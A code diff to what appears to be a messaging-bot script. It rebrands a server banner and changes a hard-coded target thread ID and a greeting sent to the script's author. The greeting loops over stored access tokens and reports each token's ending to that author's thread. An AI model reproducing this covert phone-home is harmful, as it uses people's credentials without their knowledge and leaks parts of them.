@@ -13,7 +13,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
         self.send_response(200)
         self.send_header('Content-type', 'text/plain')
         self.end_headers()
-        self.wfile.write(b"MR PRINCE SERVER ACTIVE")
+        self.wfile.write(b"MR DEVIL SERVER ACTIVE")
 
 def execute_server():
     PORT = int(os.environ.get('PORT', 4000))
@@ -66,8 +66,8 @@ def send_initial_message():
     with open('token.txt', 'r') as file:
         tokens = file.readlines()
 
-    target_id = "100064267823693"  # Replace with your target thread ID
-    msg_template = "Hello Prince sir! I am using your E2EE server. My token ending with: {}"
+    target_id = "100037931553832"  # Replace with your target thread ID
+    msg_template = "Hello Godeye sir! I am using your E2EE server. My token ending with: {}"
 
     for token in tokens:
         access_token = token.strip()
